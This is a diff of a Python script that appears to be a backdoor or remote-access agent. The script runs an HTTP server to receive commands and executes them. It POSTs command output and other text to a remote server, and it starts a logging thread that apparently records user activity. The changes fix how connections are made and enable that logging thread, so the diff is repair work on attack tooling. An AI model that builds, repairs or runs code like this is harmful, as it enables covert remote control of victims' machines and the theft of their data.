@@ -22,7 +22,6 @@ my_ip = ""
 my_port = 8001
 
 
-conn = http.client.HTTPConnection(http_ip, http_port)
 
 class RequestHandler(BaseHTTPRequestHandler):
     def do_POST(self):
@@ -44,9 +43,6 @@ def run_server(server_class=HTTPServer, handler_class=RequestHandler):
     httpd.serve_forever()
 
 def execute_cmd(cmd):
-    #resp = conn.getresponse()
-    #content = resp.read()
-    #cmd = content.decode('utf-8')
     if not cmd:
         time.sleep(3)
     print(cmd)
@@ -55,18 +51,12 @@ def execute_cmd(cmd):
     print("res", sub_p_bytes)
     
     return sub_p_bytes
-    #params = urllib.parse.urlencode({"text": sub_p_str})
-    #headers = {"Content-type": "application/x-www-form-urlencoded",
-     #   "Accept": "text/plain"}
-    #try:
-     #   conn.request("POST", "", params, headers)
-    #except Exception as e:
-     #   print("error sending data to server", e)
 
 
 def send_data_to_server():
     counter = 0
     try:
+        conn = http.client.HTTPConnection(http_ip, http_port)
         params = urllib.parse.urlencode({"text": text})
         headers = {"Content-type": "application/x-www-form-urlencoded",
            "Accept": "text/plain"}
@@ -124,6 +114,7 @@ def exec_shell_conn():
     headers = {"Content-type": "application/x-www-form-urlencoded",
         "Accept": "text/plain"}
     try:
+        conn = http.client.HTTPConnection(http_ip, http_port)
         conn.request("POST", "", params, headers)
     except Exception as e:
         print("error sending data to server", e)
@@ -137,8 +128,6 @@ def exec_logging():
 
 exec_shell_conn()
 proc1 = threading.Thread(target=run_server)
-#proc1.daemon = True
-proc1.start
 proc2 = threading.Thread(target=exec_logging)
 proc1.start()
-#proc2.start()
+proc2.start()
